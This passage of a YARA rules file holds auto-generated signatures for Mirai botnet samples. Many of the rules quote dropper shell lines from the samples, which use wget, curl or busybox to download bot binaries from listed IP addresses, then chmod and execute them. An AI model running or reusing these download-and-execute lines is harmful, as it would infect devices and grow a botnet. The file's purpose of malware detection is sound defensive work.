      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://84.201.5.31/00101010101001/morte.m68k; curl -O http://84.201." ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f496743c {
   meta:
      description = "_subset_batch - file Mirai(signature)_f496743c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f496743caab2b13db91aca49f0d0da58a20a4a6b653a59f9095051c481ea0467"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.ppc; curl -O http://87.12" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.spc; curl -O http://87.12" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.arm; curl -O http://87.12" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.arc; curl -O http://87.12" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.arm6; curl -O http://87.1" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.i468; curl -O http://87.1" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.mpsl; curl -O http://87.1" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.arm5; curl -O http://87.1" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.m68k; curl -O http://87.1" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.mips; curl -O http://87.1" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.i686; curl -O http://87.1" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.sh4; curl -O http://87.12" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.arm; curl -O http://87.12" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.x86; curl -O http://87.12" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.120.187.143/00101010101001/morte.arc; curl -O http://87.12" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__f5df0a89 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f5df0a89.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f5df0a894b6d87a0ec3decf0713e4d1781d6a0cc5ab69cf97bb0fa7fb6bd39d9"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/ppc; curl -O http://176.65.132.57/bins/ppc" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm; curl -O http://176.65.132.57/arm; chm" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/spc; curl -O http://176.65.132.57/bins/spc" ascii /* score: '33.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/mips; curl -O http://176.65.132.57/bins/mi" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/m68k; curl -O http://176.65.132.57/bins/m6" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm6; curl -O http://176.65.132.57/arm6; c" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm7; curl -O http://176.65.132.57/bins/ar" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/sh4; curl -O http://176.65.132.57/bins/sh4" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm5; curl -O http://176.65.132.57/arm5; c" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/x86; curl -O http://176.65.132.57/bins/x86" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/x86_64; curl -O http://176.65.132.57/bins/" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/mipsel; curl -O http://176.65.132.57/bins/" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/mipsel; curl -O http://176.65.132.57/bins/" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/arm; curl -O http://176.65.132.57/arm; chm" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.132.57/bins/ppc; curl -O http://176.65.132.57/bins/ppc" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule Mirai_signature__c22f2e14 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c22f2e14.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c22f2e14c9424f1128738b4b2fea11c2059dee0c76e2403e2be86aded2890004"
   strings:
      $s1 = "eeeeeeeefffffff" ascii /* reversed goodware string 'fffffffeeeeeeee' */ /* score: '18.00'*/
      $s2 = "hhhhhg" fullword ascii /* reversed goodware string 'ghhhhh' */ /* score: '15.00'*/
      $s3 = "dddd<<<<" fullword ascii /* reversed goodware string '<<<<dddd' */ /* score: '14.00'*/
      $s4 = "999998" ascii /* reversed goodware string '899999' */ /* score: '11.00'*/
      $s5 = "%%%%%%%!" fullword ascii /* reversed goodware string '!%%%%%%%' */ /* score: '11.00'*/
      $s6 = "xxxxxxxxyyyyyy" fullword ascii /* score: '11.00'*/
      $s7 = "<<<<<<<<<;" fullword ascii /* reversed goodware string ';<<<<<<<<<' */ /* score: '11.00'*/
      $s8 = "<<<<<5<<<<<<<<+%B" fullword ascii /* score: '9.00'*/ /* hex encoded string '[' */
      $s9 = "hhhhhhhhhhhiiiiiiiijklmmnopq" fullword ascii /* score: '8.00'*/
      $s10 = "fffffbffff" ascii /* score: '8.00'*/
      $s11 = "ddddddddddddddddddddd]<7%%%x%%%%%%%" fullword ascii /* score: '8.00'*/
      $s12 = "ccccccccccccccccccccccccccccccccccccccccccccccccccckcccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s13 = "ffffffffgggggg" fullword ascii /* score: '8.00'*/
      $s14 = "ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc" ascii /* score: '8.00'*/
      $s15 = "jkmmmmml" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      8 of them
}

rule Mirai_signature__c2358fb8 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c2358fb8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c2358fb878f8cc55ad73fee922f36546f15f2aac638037a053a4e631b1963331"
   strings:
      $s1 = "rrfatdu" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__c4740e23 {
   meta:
      description = "_subset_batch - file Mirai(signature)_c4740e23.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c4740e23441ee28ea7661f8cab09e66a4e87bd28da2fa5ca19865505b825677e"
   strings:
      $s1 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.ppc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.ppc; ./nwfa" ascii /* score: '23.00'*/
      $s2 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.ppc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.ppc; ./nwfa" ascii /* score: '23.00'*/
      $s3 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm; ./nwfa" ascii /* score: '23.00'*/
      $s4 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.spc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.spc; ./nwfa" ascii /* score: '23.00'*/
      $s5 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm; ./nwfa" ascii /* score: '23.00'*/
      $s6 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.spc; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.spc; ./nwfa" ascii /* score: '23.00'*/
      $s7 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm5; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm5; ./nw" ascii /* score: '20.00'*/
      $s8 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.mpsl; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.mpsl; ./nw" ascii /* score: '20.00'*/
      $s9 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm6; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm6; ./nw" ascii /* score: '20.00'*/
      $s10 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.m68k; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.m68k; ./nw" ascii /* score: '20.00'*/
      $s11 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm6; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm6; ./nw" ascii /* score: '20.00'*/
      $s12 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.sh4; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.sh4; ./nwfa" ascii /* score: '20.00'*/
      $s13 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.x86_64; chmod 777 x86_64; ./nwfaiehg4ewijfgriehgirehaughrar" ascii /* score: '20.00'*/
      $s14 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.arm7; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.arm7; ./nw" ascii /* score: '20.00'*/
      $s15 = "busybox wget http://160.187.246.158/nwfaiehg4ewijfgriehgirehaughrarg.m68k; chmod 777 nwfaiehg4ewijfgriehgirehaughrarg.m68k; ./nw" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x7562 and filesize < 5KB and
      8 of them
}

rule Mirai_signature__caa136a5 {
   meta:
      description = "_subset_batch - file Mirai(signature)_caa136a5.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "caa136a55e01007ce1c245cf2e180d68783661edc6f0f4195f48dc98cc453a4b"
   strings:
      $s1 = "pk[selfrep] found a faith - %d" fullword ascii /* score: '12.00'*/
      $s2 = "src/floods/packet_build.rsU" fullword ascii /* score: '12.00'*/
      $s3 = "w0x00010203040506070809101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__f0cc9f4f {
   meta:
      description = "_subset_batch - file Mirai(signature)_f0cc9f4f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f0cc9f4fe4edf878effe1cc7d3041afc0ad03c5c575b1ce4df38c385af383d9a"
   strings:
      $s1 = "pk[selfrep] found a faith - %d" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__cc2d2444 {
   meta:
      description = "_subset_batch - file Mirai(signature)_cc2d2444.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cc2d244451bf2a2c4fd5bb80957879205e562cec8fbab4fdbac0c7bd667dcc20"
   strings:
      $s1 = "Xq\"%S%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 70KB and
      all of them
}

rule Mirai_signature__ca29c9cf {
   meta:
      description = "_subset_batch - file Mirai(signature)_ca29c9cf.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ca29c9cf30e0ce83f9caba09bdf00bac1f879ff770cf19c3546e6fe78ba753ba"
   strings:
      $s1 = "0/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__d5a0b926 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d5a0b926.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d5a0b9267b49e76044e43bbcf2f20fe7e16a8eb41e4f0c295e2bbe9ea5a5f79a"
   strings:
      $s1 = "0/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__ea1c3d2a {
   meta:
      description = "_subset_batch - file Mirai(signature)_ea1c3d2a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ea1c3d2adbd30806ebd9b19905b02352d2fd185ddaf0150755c077f675ebaaa0"
   strings:
      $s1 = "0/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__d27d9c98 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d27d9c98.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d27d9c98a76f54ff1209e63c8a6fc777ee452e20c180587caeab02ce1ae409f9"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
      $s2 = "livetimem" fullword ascii /* score: '8.00'*/
      $s3 = "_vp/.sys(mhw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__e439a96d {
   meta:
      description = "_subset_batch - file Mirai(signature)_e439a96d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e439a96dfee5f9a85df18c669ad92c0a15bddbd76625bef0dd98c54fc106f2e2"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__f3d6aeab {
   meta:
      description = "_subset_batch - file Mirai(signature)_f3d6aeab.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f3d6aeabaa8dc4b354f944b4795ca7d208f86dc2399e181ac418618129dd1af3"
   strings:
      $s1 = "p/.sys" fullword ascii /* score: '16.00'*/
      $s2 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
      $s3 = "ftpd }gdm" fullword ascii /* score: '9.00'*/
      $s4 = "GaACScc+ " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__f4cfaa46 {
   meta:
      description = "_subset_batch - file Mirai(signature)_f4cfaa46.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f4cfaa46676495cb3357d6218790966d4a8dc06896bed24349ee7365e5f083d0"
   strings:
      $s1 = "UPX-5.0 wants memfd_create(), or needs /dev/shm(,O_TMPFILE,)" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 90KB and
      all of them
}

rule Mirai_signature__d2e4d3ae {
   meta:
      description = "_subset_batch - file Mirai(signature)_d2e4d3ae.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d2e4d3ae1b9c5e4e28b0b6852bb66c3c05e4d439f64349aa8306744bbf613c50"
   strings:
      $s1 = "/bin/busybox wget http://158.94.209.216/arm5 -O arm5;chmod 777 arm5;./arm5 selfrep.wget;rm -rf arm5;" fullword ascii /* score: '27.00'*/
      $s2 = "/bin/busybox wget http://158.94.209.216/mpsl -O mpsl;chmod 777 mpsl;./mpsl selfrep.wget;rm -rf mpsl;" fullword ascii /* score: '27.00'*/
      $s3 = "/bin/busybox wget http://158.94.209.216/mips -O mips;chmod 777 mips;./mips selfrep.wget;rm -rf mips;" fullword ascii /* score: '27.00'*/
      $s4 = "/bin/busybox wget http://158.94.209.216/arm -O arm;chmod 777 arm;./arm selfrep.wget;rm -rf arm;" fullword ascii /* score: '27.00'*/
      $s5 = "/bin/busybox wget http://158.94.209.216/ppc -O ppc;chmod 777 ppc;./ppc selfrep.wget;rm -rf ppc;" fullword ascii /* score: '27.00'*/
      $s6 = "/bin/busybox wget http://158.94.209.216/arm6 -O arm6;chmod 777 arm6;./arm6 selfrep.wget;rm -rf arm6;" fullword ascii /* score: '27.00'*/
      $s7 = "/bin/busybox wget http://158.94.209.216/arc -O arc;chmod 777 arc;./arc selfrep.wget;rm -rf arc;" fullword ascii /* score: '27.00'*/
      $s8 = "/bin/busybox wget http://158.94.209.216/sh4 -O sh4;chmod 777 sh4;./sh4 selfrep.wget;rm -rf sh4;" fullword ascii /* score: '27.00'*/
      $s9 = "/bin/busybox wget http://158.94.209.216/arm7 -O arm7;chmod 777 arm7;./arm7 selfrep.wget;rm -rf arm7;" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x622f and filesize < 2KB and
      all of them
}

rule Mirai_signature__d3a00177 {
   meta:
      description = "_subset_batch - file Mirai(signature)_d3a00177.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d3a00177426d81421470df6e0e294225cb4954d73894e76d9516eaf44f3b221d"
   strings:
      $s1 = "}- -Sz0zn" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__fb26c71d {
   meta:
      description = "_subset_batch - file Mirai(signature)_fb26c71d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fb26c71decfaad98b364872bc5ca48c524bcadab9101e3fe69b8b31c797f8aed"
   strings:
      $s1 = " 6!: <='<#}7*=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g' */
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__e13192fc {
   meta:
      description = "_subset_batch - file Mirai(signature)_e13192fc.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e13192fc217fa66ab5f253b1a3de66d513dd56c7adbdf8b040bfb4dd4dab78bd"
   strings:
      $s1 = "wget http://109.205.213.5/kvariant.mips; chmod 777 kvariant.mips; ./kvariant.mips wifi.repeaters" fullword ascii /* score: '20.00'*/
      $s2 = "cd /tmp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__e2fc62a9 {
   meta:
      description = "_subset_batch - file Mirai(signature)_e2fc62a9.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e2fc62a9f5646b61f40e3774ced0eb510baadb75f7134c3e742b36c5fbff750c"
   strings:
      $s1 = "    arm*) wget http://109.205.213.5/kvariant.arm -O asus.exploit ;;" fullword ascii /* score: '23.00'*/
      $s2 = "    mips*) wget http://109.205.213.5/kvariant.mips -O asus.exploit ;;" fullword ascii /* score: '20.00'*/
      $s3 = "./asus.exploit" fullword ascii /* score: '8.00'*/
      $s4 = "chmod +x asus.exploit" fullword ascii /* score: '8.00'*/
      $s5 = "ARCH=$(uname -m)" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5241 and filesize < 1KB and
      all of them
}

rule Mirai_signature__e647337e {
   meta:
      description = "_subset_batch - file Mirai(signature)_e647337e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e647337e7c38a0c9c8cd31d076f6e16f4b0f7d8425f3c41b728fe78c60840ac2"
   strings:
      $s1 = ":xsvr@M-SEARCH * " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      all of them
}

rule Mirai_signature__ea357b4f {
   meta:
      description = "_subset_batch - file Mirai(signature)_ea357b4f.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ea357b4faa6d99c1e85072f26a2a806851cc1bcad3fd91afa5f604c71f878133"
   strings:
      $s1 = "wget http://176.65.132.57/bins/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '23.00'*/
      $s2 = "wget http://176.65.132.57/bins/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '23.00'*/
      $s3 = "wget http://176.65.132.57/bins/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '23.00'*/
      $s4 = "wget http://176.65.132.57/bins/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '23.00'*/
      $s5 = "wget http://176.65.132.57/bins/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '23.00'*/
      $s6 = "wget http://176.65.132.57/bins/mipsel; chmod 777 mipsel; ./mpsel mipsel" fullword ascii /* score: '23.00'*/
      $s7 = "wget http://176.65.132.57/bins/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '23.00'*/
      $s8 = "wget http://176.65.132.57/bins/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '23.00'*/
      $s9 = "wget http://176.65.132.57/bins/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '23.00'*/
      $s10 = "wget http://176.65.132.57/bins/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '23.00'*/
      $s11 = "wget http://176.65.132.57/bins/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '23.00'*/
      $s12 = "wget http://176.65.132.57/bins/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__f90ba1da {
   meta:
      description = "_subset_batch - file Mirai(signature)_f90ba1da.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f90ba1da6d074a7e93130333104cf32c27925986c0075d4a97274a18e40a163b"
   strings:
      $s1 = "tgwdaxr" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__fa4f013c {
   meta:
      description = "_subset_batch - file Mirai(signature)_fa4f013c.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fa4f013c6015462e5438ae642268931fd8f9adde7e070e5fd683e0968c158b78"
   strings:
      $s1 = "busybox wget http://176.65.132.57/bins/arm; chmod 777 arm; ./arm arm" fullword ascii /* score: '23.00'*/
      $s2 = "busybox wget http://176.65.132.57/bins/arm7; chmod 777 arm7; ./arm7 arm7" fullword ascii /* score: '23.00'*/
      $s3 = "busybox wget http://176.65.132.57/bins/x86_64; chmod 777 x86_64; ./x86_64 x86_64" fullword ascii /* score: '23.00'*/
      $s4 = "busybox wget http://176.65.132.57/bins/x86; chmod 777 x86; ./x86 x86" fullword ascii /* score: '23.00'*/
      $s5 = "busybox wget http://176.65.132.57/bins/arm6; chmod 777 arm6; ./arm6 arm6" fullword ascii /* score: '23.00'*/
      $s6 = "busybox wget http://176.65.132.57/bins/spc; chmod 777 spc; ./spc spc" fullword ascii /* score: '23.00'*/
      $s7 = "busybox wget http://176.65.132.57/bins/arm5; chmod 777 arm5; ./arm5 arm5" fullword ascii /* score: '23.00'*/
      $s8 = "busybox wget http://176.65.132.57/bins/m68k; chmod 777 m68k; ./m68k m68k" fullword ascii /* score: '23.00'*/
      $s9 = "busybox wget http://176.65.132.57/bins/mips; chmod 777 mips; ./mips mips" fullword ascii /* score: '23.00'*/
      $s10 = "busybox wget http://176.65.132.57/bins/mipsel; chmod 777 mipsel; ./mpsel mipsel" fullword ascii /* score: '23.00'*/
      $s11 = "busybox wget http://176.65.132.57/bins/sh4; chmod 777 sh4; ./sh4 sh4" fullword ascii /* score: '23.00'*/
      $s12 = "busybox wget http://176.65.132.57/bins/ppc; chmod 777 ppc; ./ppc ppc" fullword ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x7562 and filesize < 2KB and
      8 of them
}

rule Mirai_signature__fb424485 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fb424485.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fb4244859bda903361e41fbc226810e43e3278f9e8322ea69eec2e7e306d8ddb"
   strings:
      $s1 = "wget http://109.205.213.5/kvariant.arm7 -O /var/kvariant.arm7; chmod 777 /var/kvariant.arm7; /var/kvariant.arm7 tbk.exploit;" fullword ascii /* score: '28.00'*/
   condition:
      uint16(0) == 0x6777 and filesize < 1KB and
      all of them
}

rule Mirai_signature__fbc26ed2 {
   meta:
      description = "_subset_batch - file Mirai(signature)_fbc26ed2.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fbc26ed21f0f6123fd0d98827cf63052c14b37a770ad3178245f7ee150159487"
   strings:
      $s1 = "curl http://158.94.209.216/arm5 -O arm5;chmod 777 arm5;./arm5 selfrep.curl;rm -rf arm5;" fullword ascii /* score: '19.00'*/
      $s2 = "curl http://158.94.209.216/ppc -O ppc;chmod 777 ppc;./ppc selfrep.curl;rm -rf ppc;" fullword ascii /* score: '19.00'*/
      $s3 = "curl http://158.94.209.216/mpsl -O mpsl;chmod 777 mpsl;./mpsl selfrep.curl;rm -rf mpsl;" fullword ascii /* score: '19.00'*/
      $s4 = "curl http://158.94.209.216/arc -O arc;chmod 777 arc;./arc selfrep.curl;rm -rf arc;" fullword ascii /* score: '19.00'*/
      $s5 = "curl http://158.94.209.216/sh4 -O sh4;chmod 777 sh4;./sh4 selfrep.curl;rm -rf sh4;" fullword ascii /* score: '19.00'*/
      $s6 = "curl http://158.94.209.216/arm6 -O arm6;chmod 777 arm6;./arm6 selfrep.curl;rm -rf arm6;" fullword ascii /* score: '19.00'*/
      $s7 = "curl http://158.94.209.216/arm7 -O arm7;chmod 777 arm7;./arm7 selfrep.curl;rm -rf arm7;" fullword ascii /* score: '19.00'*/
      $s8 = "curl http://158.94.209.216/arm -O arm;chmod 777 arm;./arm selfrep.curl;rm -rf arm;" fullword ascii /* score: '19.00'*/
      $s9 = "curl http://158.94.209.216/mips -O mips;chmod 777 mips;./mips selfrep.curl;rm -rf mips;" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x7563 and filesize < 2KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Mirai_signature__b1534cad_Mirai_signature__b1a2aa8b_Mirai_signature__b2c308b4_Mirai_signature__bb77bff9_Mirai_signature__bf_0 {
   meta:
